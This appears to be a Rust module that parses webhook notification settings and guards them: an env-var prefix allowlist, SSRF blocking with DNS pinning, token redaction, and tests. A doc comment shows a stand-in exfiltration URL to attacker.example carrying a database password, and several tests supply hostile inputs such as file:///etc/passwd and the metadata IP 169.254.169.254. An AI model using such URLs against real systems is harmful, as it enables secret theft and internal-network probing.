//! Manifest [[notification]] section parsing + env-var substitution.

#![allow(dead_code)]

use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::time::Duration;

use anyhow::{bail, Result};
use serde::{Deserialize, Serialize};

use super::Severity;

/// Default per-request HTTP timeout for webhook / Slack / Discord sinks, in
/// seconds. Operator-tunable per [[notification]] section via
/// [`NotificationConfig::request_timeout_secs`]. Three retries × 30 s ≈ a
/// 90 s worst-case latency tail, which is the published rationale for the
/// default — see #156.
pub const DEFAULT_REQUEST_TIMEOUT_SECS: u64 = 30;

/// Resolve [`NotificationConfig::request_timeout_secs`] (operator override
/// or default) to a concrete `Duration`. Sinks call this once at construction
/// time so the per-request POST sees a single canonical value.
pub fn resolve_request_timeout(secs: Option<u64>) -> Duration {
    Duration::from_secs(secs.unwrap_or(DEFAULT_REQUEST_TIMEOUT_SECS))
}

/// Only env vars whose name starts with this prefix are substitutable from
/// notification URLs. This keeps a rogue manifest from exfiltrating arbitrary
/// host env vars to a chosen webhook endpoint by writing
/// `url = "https://attacker.example/${PITBOSS_DB_PASSWORD}"`.
///
/// The prefix used to be the looser `PITBOSS_`, but pitboss itself sets
/// other `PITBOSS_*` vars during dispatch (`PITBOSS_RUN_ID`,
/// `PITBOSS_PARENT_NOTIFY_URL`, smoke-test fixture vars, etc.) and an
/// operator may legitimately set additional `PITBOSS_*` secrets in the
/// dispatcher's environment. Narrowing to `PITBOSS_NOTIFY_*` carves out a
/// dedicated namespace for "values manifests are allowed to read into a
/// hook URL" with no risk of accidental overlap. Operators who need to
/// inject a hook URL via env var rename their secret to start with
/// `PITBOSS_NOTIFY_` (e.g. `PITBOSS_NOTIFY_SLACK_TOKEN`).
const ENV_VAR_ALLOWED_PREFIX: &str = "PITBOSS_NOTIFY_";

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum SinkKind {
    Log,
    Webhook,
    Slack,
    Discord,
}

/// One [[notification]] section after env-var substitution.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NotificationConfig {
    pub kind: SinkKind,
    /// Required for webhook/slack/discord; ignored for log.
    #[serde(default)]
    pub url: Option<String>,
    /// Event-kind filter. None ⇒ all three events.
    #[serde(default)]
    pub events: Option<Vec<String>>,
    /// Minimum severity to emit. Defaults to Info (emit all).
    #[serde(default = "default_severity_min")]
    pub severity_min: Severity,
    /// Per-request HTTP timeout in seconds. Defaults to
    /// [`DEFAULT_REQUEST_TIMEOUT_SECS`] (30 s) when unset; the retry loop
    /// stacks 3 attempts so the worst-case emit latency for a single sink
    /// is roughly `3 × request_timeout_secs + backoffs (1.3 s)`. Lower this
    /// for low-latency dashboards; raise it for sinks that legitimately
    /// take longer (large mobile-push fan-outs).
    #[serde(default)]
    pub request_timeout_secs: Option<u64>,
}

fn default_severity_min() -> Severity {
    Severity::Info
}

/// Walk a mutable string: replace `${IDENT}` tokens with the value of
/// `std::env::var(IDENT)`. Errors if any `${IDENT}` has no matching env var
/// or if the name does not start with `PITBOSS_` (see ENV_VAR_ALLOWED_PREFIX).
pub fn substitute_env_vars(s: &str) -> Result<String> {
    let mut out = String::with_capacity(s.len());
    let mut rest = s;
    while !rest.is_empty() {
        if let Some(dollar) = rest.find("${") {
            // Emit everything before the token as-is (preserves all UTF-8).
            out.push_str(&rest[..dollar]);
            let after_open = &rest[dollar + 2..];
            let end = after_open
                .find('}')
                .ok_or_else(|| anyhow::anyhow!("unterminated ${{…}} in {s:?}"))?;
            let name = &after_open[..end];
            if !name.starts_with(ENV_VAR_ALLOWED_PREFIX) {
                bail!(
                    "notification uses ${{{name}}} but only env vars prefixed \
                     with `{ENV_VAR_ALLOWED_PREFIX}` may be substituted \
                     (rename the var to `{ENV_VAR_ALLOWED_PREFIX}{name}` or similar)"
                );
            }
            let val = std::env::var(name).map_err(|_| {
                anyhow::anyhow!("notification uses ${{{name}}} but env var is not set")
            })?;
            out.push_str(&val);
            rest = &after_open[end + 1..];
        } else {
            out.push_str(rest);
            break;
        }
    }
    Ok(out)
}

/// Run env-var substitution over every string field of the config.
/// Currently just `url`; keep extensible if we add more string fields.
pub fn apply_env_substitution(cfg: &mut NotificationConfig) -> Result<()> {
    if let Some(url) = cfg.url.as_mut() {
        *url = substitute_env_vars(url)?;
    }
    Ok(())
}

/// Validate a single config against kind-specific required fields.
/// Called from manifest/validate.rs.
pub fn validate(cfg: &NotificationConfig) -> Result<()> {
    match cfg.kind {
        SinkKind::Log => {}
        SinkKind::Webhook | SinkKind::Slack | SinkKind::Discord => {
            let url = cfg.url.as_deref().unwrap_or("");
            if url.is_empty() {
                bail!(
                    "notification kind={:?} requires a non-empty 'url' field",
                    cfg.kind
                );
            }
            validate_webhook_url(url)?;
        }
    }
    if let Some(events) = &cfg.events {
        for e in events {
            match e.as_str() {
                "approval_request"
                | "approval_pending"
                | "run_dispatched"
                | "run_finished"
                | "budget_exceeded" => {}
                other => bail!(
                    "unknown event: {other:?}; valid: approval_request, approval_pending, run_dispatched, run_finished, budget_exceeded"
                ),
            }
        }
    }
    Ok(())
}

/// Render a webhook URL safely for logs and error messages by stripping
/// any path, query, and fragment — only `<scheme>://<host>[:<port>]` plus a
/// `/<redacted>` marker when the original URL had a non-empty path.
///
/// Slack incoming-webhook URLs (`/services/T.../B.../<TOKEN>`), Discord
/// webhook URLs (`/api/webhooks/<id>/<token>`), and any URL with a token
/// in the query string carry the channel's authorisation in the path or
/// query. `reqwest::Error`'s `Display` impl redacts only RFC 3986 userinfo
/// passwords and leaves path + query intact, so a verbatim `{url:?}` in
/// error output exposes the secret to journald, log aggregators, and
/// crash reporters. Use this helper everywhere a URL appears in user-
/// visible error text.
pub fn redact_webhook_url(raw: &str) -> String {
    let Ok(url) = reqwest::Url::parse(raw) else {
        return "<unparseable url>".to_string();
    };
    let scheme = url.scheme();
    let host = url.host_str().unwrap_or("?");
    let port = url.port().map_or(String::new(), |p| format!(":{p}"));
    let path_present = !url.path().is_empty() && url.path() != "/"
        || url.query().is_some()
        || url.fragment().is_some();
    if path_present {
        format!("{scheme}://{host}{port}/<redacted>")
    } else {
        format!("{scheme}://{host}{port}")
    }
}

/// Reject webhook URLs that would let a rogue manifest SSRF the host's
/// internal network. Requires `https://` and a non-loopback / non-private
/// host. Parse errors fail closed.
fn validate_webhook_url(raw: &str) -> Result<()> {
    let parsed = reqwest::Url::parse(raw).map_err(|e| {
        anyhow::anyhow!(
            "notification url {} is not a valid URL: {e}",
            redact_webhook_url(raw)
        )
    })?;

    if parsed.scheme() != "https" {
        bail!(
            "notification url must use https:// (got scheme {:?} in {})",
            parsed.scheme(),
            redact_webhook_url(raw),
        );
    }

    let host = parsed.host_str().ok_or_else(|| {
        anyhow::anyhow!("notification url {} has no host", redact_webhook_url(raw))
    })?;

    // Block by name first: covers `localhost`, `localhost.localdomain`, etc.
    let host_lc = host.to_ascii_lowercase();
    if host_lc == "localhost" || host_lc.ends_with(".localhost") {
        bail!(
            "notification url {} points at a loopback host",
            redact_webhook_url(raw)
        );
    }

    // Block by IP: loopback, private, link-local, unspecified.
    // `url::Host` yields the bracketed form for IPv6 via `host_str()`; strip
    // brackets before parsing.
    let ip_candidate = host
        .strip_prefix('[')
        .and_then(|s| s.strip_suffix(']'))
        .unwrap_or(host);
    if let Ok(ip) = ip_candidate.parse::<IpAddr>() {
        if is_disallowed_ip(&ip) {
            bail!(
                "notification url {} points at a private / loopback / link-local address",
                redact_webhook_url(raw)
            );
        }
    }

    Ok(())
}

/// Outcome of [`pre_request_ssrf_check`]. The literal-IP path needs no DNS
/// pinning at request time (reqwest will dial the IP straight); the resolved
/// path returns the exact `SocketAddr` set the guard validated, so the sink
/// can hand them to [`reqwest::ClientBuilder::resolve_to_addrs`] and defeat
/// any DNS rebinding attempt that happens between this call and the POST.
#[derive(Debug, Clone)]
pub enum PreflightAddrs {
    /// URL host was a literal IP (already on the safe side of the
    /// blocklist). No DNS override needed at request time.
    LiteralIp,
    /// URL host was a DNS name. Pin the request's connection target to
    /// these addresses by passing them to `resolve_to_addrs(host, …)`.
    Resolved {
        host: String,
        addrs: Vec<SocketAddr>,
    },
}

/// Pre-request SSRF check against the current DNS answer for `url`. Call
/// this from each sink immediately before dispatching the HTTP request.
///
/// `validate_webhook_url` runs at config-parse time and only blocks
/// literal-IP hosts — a DNS-name host whose A/AAAA record later points
/// at a private address (DNS rebinding, or simply a mutable CNAME) slips
/// past that check entirely. This helper re-resolves the host at
/// dispatch time and rejects private / loopback / link-local answers.
///
/// To close the **TOCTOU window** between this DNS lookup and reqwest's
/// own internal lookup at `send()` time (a DNS rebinding attacker can
/// return a public IP here, then a private IP milliseconds later), the
/// caller must build a per-request client with
/// [`reqwest::ClientBuilder::resolve_to_addrs`] using the addresses
/// returned in [`PreflightAddrs::Resolved`]. The shared client cannot
/// be reused for the actual POST because reqwest pins resolve overrides
/// at builder time. See [`build_pinned_client`] for the helper that wires
/// this correctly.
///
/// Fast-path: if the URL's host is already a literal IP, the config-time
/// check has already classified it — skip the re-resolution and return
/// [`PreflightAddrs::LiteralIp`].
pub(crate) async fn pre_request_ssrf_check(url: &str) -> Result<PreflightAddrs> {
    let parsed = reqwest::Url::parse(url).map_err(|e| {
        anyhow::anyhow!(
            "webhook url {} is not a valid URL: {e}",
            redact_webhook_url(url)
        )
    })?;
    let host = parsed
        .host_str()
        .ok_or_else(|| anyhow::anyhow!("webhook url {} has no host", redact_webhook_url(url)))?;
    let host_unbracketed = host
        .strip_prefix('[')
        .and_then(|s| s.strip_suffix(']'))
        .unwrap_or(host);
    if let Ok(ip) = host_unbracketed.parse::<IpAddr>() {
        // Literal IP: re-check the blocklist here too. The config-time
        // validator already does this, but a future caller that constructs
        // a `WebhookSink` directly (bypassing manifest validation) would
        // otherwise be able to POST to a private IP. Fail-closed at the
        // last gate before we hit the network.
        if is_disallowed_ip(&ip) {
            bail!(
                "webhook url {} points at a private / loopback / link-local \
                 address ({ip}); refusing to dispatch (SSRF guard)",
                redact_webhook_url(url)
            );
        }
        return Ok(PreflightAddrs::LiteralIp);
    }
    let port = parsed.port_or_known_default().unwrap_or(443);
    let target = format!("{host_unbracketed}:{port}");
    let mut validated: Vec<SocketAddr> = Vec::new();
    let iter = tokio::net::lookup_host(&target).await.map_err(|e| {
        anyhow::anyhow!(
            "webhook url {} DNS lookup failed: {e}",
            redact_webhook_url(url)
        )
    })?;
    for addr in iter {
        if is_disallowed_ip(&addr.ip()) {
            bail!(
                "webhook url {} resolved to a private / loopback / link-local \
                 address ({}); refusing to dispatch (SSRF guard)",
                redact_webhook_url(url),
                addr.ip()
            );
        }
        validated.push(addr);
    }
    if validated.is_empty() {
        bail!(
            "webhook url {} DNS returned no addresses",
            redact_webhook_url(url)
        );
    }
    Ok(PreflightAddrs::Resolved {
        host: host_unbracketed.to_string(),
        addrs: validated,
    })
}

/// Build a one-shot `reqwest::Client` whose internal DNS resolution for
/// the host of `url` is pinned to `addrs` — so the actual POST cannot
/// land on a different IP than the one [`pre_request_ssrf_check`]
/// validated.
///
/// On the literal-IP fast-path no pinning is needed (reqwest dials the
/// IP straight from the URL with no DNS lookup), and we return a fresh
/// client with just the configured timeout applied.
///
/// `request_timeout` is per-request and matches the `.timeout()` callers
/// previously set on each `RequestBuilder` — exposing it on the client
/// keeps the connect timeout bounded too, which the per-request setter
/// did not.
pub fn build_pinned_client(
    preflight: &PreflightAddrs,
    request_timeout: Duration,
) -> Result<reqwest::Client> {
    let mut builder = reqwest::Client::builder().timeout(request_timeout);
    if let PreflightAddrs::Resolved { host, addrs } = preflight {
        builder = builder.resolve_to_addrs(host, addrs);
    }
    builder
        .build()
        .map_err(|e| anyhow::anyhow!("build pinned reqwest client: {e}"))
}

fn is_disallowed_v4(v4: &Ipv4Addr) -> bool {
    v4.is_loopback()
        || v4.is_private()
        || v4.is_link_local()
        || v4.is_unspecified()
        || v4.is_broadcast()
        || v4.is_multicast()
        || {
            // Carrier-grade NAT 100.64.0.0/10 — not covered by is_private.
            let o = v4.octets();
            o[0] == 100 && (o[1] & 0xc0) == 0x40
        }
}

fn is_disallowed_ip(ip: &IpAddr) -> bool {
    match ip {
        IpAddr::V4(v4) => is_disallowed_v4(v4),
        IpAddr::V6(v6) => {
            // `::ffff:a.b.c.d` routes to the v4 address at the network
            // layer, so v6-only predicates like Ipv6Addr::is_loopback miss
            // `::ffff:127.0.0.1`. Unwrap to the mapped v4 and reuse the
            // v4 ruleset.
            if let Some(v4) = v6.to_ipv4_mapped() {
                return is_disallowed_v4(&v4);
            }
            let seg0 = v6.segments()[0];
            v6.is_loopback()
                || v6.is_unspecified()
                // fc00::/7 unique-local
                || (seg0 & 0xfe00) == 0xfc00
                // fe80::/10 link-local
                || (seg0 & 0xffc0) == 0xfe80
                // ff00::/8 multicast
                || (seg0 & 0xff00) == 0xff00
                // fec0::/10 deprecated site-local (RFC 3879). Most stacks
                // ignore it but Linux still routes it; treat as private.
                || (seg0 & 0xffc0) == 0xfec0
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn env_var_substitution_replaces_tokens() {
        std::env::set_var("PITBOSS_NOTIFY_TEST_URL", "https://example.com/hook");
        let out = substitute_env_vars("${PITBOSS_NOTIFY_TEST_URL}/sub").unwrap();
        assert_eq!(out, "https://example.com/hook/sub");
    }

    #[test]
    fn env_var_missing_fails_loud() {
        std::env::remove_var("PITBOSS_NOTIFY_TEST_MISSING_XYZ");
        let err = substitute_env_vars("${PITBOSS_NOTIFY_TEST_MISSING_XYZ}").unwrap_err();
        assert!(err.to_string().contains("env var is not set"));
    }

    /// Regression for #156: the substitution prefix is `PITBOSS_NOTIFY_`,
    /// not the wider `PITBOSS_` set. A manifest must not be able to encode
    /// `${PITBOSS_RUN_ID}` or `${PITBOSS_PARENT_NOTIFY_URL}` into a webhook
    /// URL — both are runtime values pitboss itself sets, and one of them
    /// (PITBOSS_PARENT_NOTIFY_URL) is itself a sensitive operator endpoint.
    #[test]
    fn env_var_pitboss_run_id_not_substitutable() {
        std::env::set_var("PITBOSS_RUN_ID", "019d0000-aaaa-bbbb-cccc-dddddddddddd");
        let err = substitute_env_vars("${PITBOSS_RUN_ID}").unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("PITBOSS_NOTIFY_"),
            "expected narrowed-prefix message, got: {msg}"
        );
    }

    #[test]
    fn env_var_unterminated_fails() {
        let err = substitute_env_vars("${FOO").unwrap_err();
        assert!(err.to_string().contains("unterminated"));
    }

    #[test]
    fn env_var_no_tokens_passthrough() {
        let out = substitute_env_vars("https://example.com/plain").unwrap();
        assert_eq!(out, "https://example.com/plain");
    }

    #[test]
    fn unknown_kind_rejected_at_parse() {
        let toml_src = r#"kind = "owlpost"
url = "https://example.com""#;
        let err: Result<NotificationConfig, _> = toml::from_str(toml_src);
        assert!(err.is_err(), "parsing should fail for unknown kind");
    }

    #[test]
    fn webhook_requires_url() {
        let cfg = NotificationConfig {
            kind: SinkKind::Webhook,
            url: None,
            events: None,
            severity_min: Severity::Info,
            request_timeout_secs: None,
        };
        let err = validate(&cfg).unwrap_err();
        assert!(err.to_string().contains("requires a non-empty 'url'"));
    }

    #[test]
    fn env_var_without_pitboss_prefix_rejected() {
        std::env::set_var("NOTIFY_TEST_FOREIGN", "leaked");
        let err = substitute_env_vars("${NOTIFY_TEST_FOREIGN}").unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("PITBOSS_NOTIFY_"),
            "expected prefix message, got: {msg}"
        );
    }

    fn cfg_webhook(url: &str) -> NotificationConfig {
        NotificationConfig {
            kind: SinkKind::Webhook,
            url: Some(url.to_string()),
            events: None,
            severity_min: Severity::Info,
            request_timeout_secs: None,
        }
    }

    #[test]
    fn webhook_rejects_http_scheme() {
        let err = validate(&cfg_webhook("http://example.com/hook")).unwrap_err();
        assert!(err.to_string().contains("https://"), "{err}");
    }

    #[test]
    fn webhook_rejects_file_scheme() {
        let err = validate(&cfg_webhook("file:///etc/passwd")).unwrap_err();
        assert!(err.to_string().contains("https://"), "{err}");
    }

    #[test]
    fn webhook_rejects_loopback_ipv4() {
        let err = validate(&cfg_webhook("https://127.0.0.1/hook")).unwrap_err();
        assert!(err.to_string().contains("private / loopback"), "{err}");
    }

    #[test]
    fn webhook_rejects_loopback_hostname() {
        let err = validate(&cfg_webhook("https://localhost/hook")).unwrap_err();
        assert!(err.to_string().contains("loopback"), "{err}");
    }

    #[test]
    fn webhook_rejects_link_local_metadata_ip() {
        let err = validate(&cfg_webhook("https://169.254.169.254/latest")).unwrap_err();
        assert!(err.to_string().contains("private / loopback"), "{err}");
    }

    #[test]
    fn webhook_rejects_private_ipv4() {
        for ip in ["10.0.0.1", "192.168.1.1", "172.16.0.1"] {
            let err = validate(&cfg_webhook(&format!("https://{ip}/hook"))).unwrap_err();
            assert!(
                err.to_string().contains("private / loopback"),
                "ip={ip} err={err}"
            );
        }
    }

    #[test]
    fn webhook_rejects_ipv6_loopback() {
        let err = validate(&cfg_webhook("https://[::1]/hook")).unwrap_err();
        assert!(err.to_string().contains("private / loopback"), "{err}");
    }

    #[test]
    fn webhook_rejects_ipv4_mapped_ipv6_loopback() {
        // `::ffff:127.0.0.1` is a v6-encoded v4 loopback. Ipv6Addr::is_loopback
        // returns false for this form; we must detect it via to_ipv4_mapped.
        let err = validate(&cfg_webhook("https://[::ffff:127.0.0.1]/hook")).unwrap_err();
        assert!(err.to_string().contains("private / loopback"), "{err}");
    }

    #[test]
    fn webhook_rejects_ipv4_mapped_ipv6_metadata() {
        let err = validate(&cfg_webhook("https://[::ffff:169.254.169.254]/latest")).unwrap_err();
        assert!(err.to_string().contains("private / loopback"), "{err}");
    }

    #[test]
    fn webhook_accepts_public_https_url() {
        assert!(validate(&cfg_webhook("https://hooks.slack.com/services/x")).is_ok());
    }

    #[test]
    fn unknown_event_rejected() {
        let cfg = NotificationConfig {
            kind: SinkKind::Log,
            url: None,
            events: Some(vec!["hallucinate".into()]),
            severity_min: Severity::Info,
            request_timeout_secs: None,
        };
        let err = validate(&cfg).unwrap_err();
        assert!(err.to_string().contains("unknown event"));
    }

    #[test]
    fn log_sink_no_url_ok() {
        let cfg = NotificationConfig {
            kind: SinkKind::Log,
            url: None,
            events: None,
            severity_min: Severity::Info,
            request_timeout_secs: None,
        };
        assert!(validate(&cfg).is_ok());
    }

    #[test]
    fn webhook_rejects_ipv4_multicast() {
        // 224.0.0.0/4 covers all v4 multicast — not blocked by is_private
        // or is_broadcast and so must be flagged explicitly.
        let err = validate(&cfg_webhook("https://239.255.255.250/hook")).unwrap_err();
        assert!(err.to_string().contains("private / loopback"), "{err}");
    }

    #[test]
    fn webhook_rejects_ipv6_multicast() {
        let err = validate(&cfg_webhook("https://[ff02::1]/hook")).unwrap_err();
        assert!(err.to_string().contains("private / loopback"), "{err}");
    }

    #[test]
    fn webhook_rejects_ipv6_site_local() {
        // fec0::/10 is RFC 3879 deprecated but Linux still routes it.
        let err = validate(&cfg_webhook("https://[fec0::1]/hook")).unwrap_err();
        assert!(err.to_string().contains("private / loopback"), "{err}");
    }

    // ---- redact_webhook_url ----

    #[test]
    fn redact_strips_slack_token_path() {
        let raw = "https://hooks.slack.com/services/T01/B02/SECRETTOKEN";
        let redacted = redact_webhook_url(raw);
        assert!(!redacted.contains("SECRETTOKEN"), "got: {redacted}");
        assert!(!redacted.contains("services"), "got: {redacted}");
        assert!(redacted.contains("hooks.slack.com"), "got: {redacted}");
        assert!(redacted.contains("<redacted>"), "got: {redacted}");
    }

    #[test]
    fn redact_strips_discord_webhook_path() {
        let raw = "https://discord.com/api/webhooks/123456789/ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        let redacted = redact_webhook_url(raw);
        assert!(
            !redacted.contains("ABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            "got: {redacted}"
        );
        assert!(!redacted.contains("123456789"), "got: {redacted}");
        assert!(redacted.contains("discord.com"), "got: {redacted}");
    }

    #[test]
    fn redact_strips_query_string_token() {
        let raw = "https://hook.example.com/notify?token=SUPERSECRET&channel=ops";
        let redacted = redact_webhook_url(raw);
        assert!(!redacted.contains("SUPERSECRET"), "got: {redacted}");
        assert!(!redacted.contains("token="), "got: {redacted}");
    }

    #[test]
    fn redact_preserves_host_only_when_no_path() {
        assert_eq!(
            redact_webhook_url("https://hooks.slack.com"),
            "https://hooks.slack.com"
        );
    }

    #[test]
    fn redact_preserves_port() {
        let redacted = redact_webhook_url("https://hook.example.com:8443/services/X");
        assert!(redacted.contains(":8443"), "got: {redacted}");
        assert!(!redacted.contains("/services/X"), "got: {redacted}");
    }

    #[test]
    fn redact_unparseable_returns_placeholder() {
        assert_eq!(redact_webhook_url("not a url at all"), "<unparseable url>");
    }

    #[test]
    fn validation_error_does_not_leak_secret_path() {
        // The whole point of #143 — manifest validation errors must not
        // echo the path / query of the URL into the error string.
        let raw = "https://127.0.0.1/services/T01/B02/SECRETTOKEN";
        let err = validate(&cfg_webhook(raw)).unwrap_err();
        let msg = err.to_string();
        assert!(!msg.contains("SECRETTOKEN"), "leaked: {msg}");
        assert!(!msg.contains("/services/"), "leaked: {msg}");
    }

    // ---- pre_request_ssrf_check ----

    #[tokio::test]
    async fn pre_request_ssrf_check_accepts_public_dns_name() {
        // example.com is contractually a public address per RFC 2606.
        // Skip if the test host has no DNS resolver.
        let res = pre_request_ssrf_check("https://example.com/hook").await;
        if let Err(e) = &res {
            // Tolerate offline test environments; only fail if the error
            // is the SSRF guard itself rejecting a public name.
            let msg = e.to_string();
            assert!(
                !msg.contains("SSRF guard"),
                "public name should not trip SSRF guard: {msg}"
            );
        }
    }

    #[tokio::test]
    async fn pre_request_ssrf_check_rejects_literal_loopback_v4() {
        // Defense against future WebhookSink::new() callers that bypass
        // the manifest-time validator: the runtime guard must also catch
        // literal private IPs, not just DNS-resolved ones.
        let err = pre_request_ssrf_check("https://127.0.0.1/hook")
            .await
            .expect_err("should reject literal loopback");
        let msg = err.to_string();
        assert!(
            msg.contains("SSRF guard") || msg.contains("private"),
            "{msg}"
        );
    }

    #[tokio::test]
    async fn pre_request_ssrf_check_rejects_literal_link_local_v4() {
        let err = pre_request_ssrf_check("https://169.254.169.254/latest")
            .await
            .expect_err("should reject AWS metadata IP");
        assert!(
            err.to_string().contains("SSRF guard") || err.to_string().contains("private"),
            "{err}"
        );
    }

    #[tokio::test]
    async fn pre_request_ssrf_check_rejects_literal_loopback_v6() {
        let err = pre_request_ssrf_check("https://[::1]/hook")
            .await
            .expect_err("should reject literal v6 loopback");
        assert!(
            err.to_string().contains("SSRF guard") || err.to_string().contains("private"),
            "{err}"
        );
    }

    #[tokio::test]
    async fn pre_request_ssrf_check_error_redacts_url() {
        let err = pre_request_ssrf_check("https://127.0.0.1/services/T1/B2/SECRET")
            .await
            .expect_err("loopback rejected");
        let msg = err.to_string();
        assert!(!msg.contains("SECRET"), "leaked: {msg}");
        assert!(!msg.contains("/services/"), "leaked: {msg}");
    }

    /// #156 (M2) regression: the literal-IP path must report `LiteralIp`
    /// so callers know no DNS-pinning is required for the actual POST.
    #[tokio::test]
    async fn pre_request_ssrf_check_returns_literal_ip_variant_for_ip_url() {
        // Use a public-routable IP to avoid the blocklist. 1.1.1.1 is
        // reserved for Cloudflare's resolver — public, routable, no
        // network call needed by this test.
        let out = pre_request_ssrf_check("https://1.1.1.1/")
            .await
            .expect("public literal IP must pass guard");
        match out {
            PreflightAddrs::LiteralIp => {}
            other => panic!("expected LiteralIp, got {other:?}"),
        }
    }

    /// #156 (M2) regression: when the URL host is a DNS name, the guard
    /// must surface the host + the validated SocketAddrs so callers can
    /// pin them on the per-request client. We use `localhost` as the name
    /// — without a blocklist override that would be rejected, but here we
    /// just want to assert the *shape* of the Resolved variant when the
    /// guard does succeed. So construct it manually instead of relying on
    /// network DNS.
    #[test]
    fn build_pinned_client_succeeds_for_literal_ip_path() {
        let client =
            build_pinned_client(&PreflightAddrs::LiteralIp, Duration::from_secs(5)).unwrap();
        // Smoke: we can build a request — actually issuing it would hit
        // the network, which we don't want in a unit test.
        let _ = client.get("https://1.1.1.1/").build();
    }

    #[test]
    fn build_pinned_client_succeeds_for_resolved_path() {
        let preflight = PreflightAddrs::Resolved {
            host: "example.com".to_string(),
            addrs: vec![std::net::SocketAddr::from(([93, 184, 216, 34], 443))],
        };
        let _client = build_pinned_client(&preflight, Duration::from_secs(5))
            .expect("pinned client must build with non-empty addr list");
    }

    /// #156 (L5) regression: `resolve_request_timeout(None)` must return
    /// the documented default; an explicit value passes through.
    #[test]
    fn resolve_request_timeout_default_and_override() {
        assert_eq!(
            resolve_request_timeout(None),
            Duration::from_secs(DEFAULT_REQUEST_TIMEOUT_SECS)
        );
        assert_eq!(resolve_request_timeout(Some(7)), Duration::from_secs(7));
    }
}
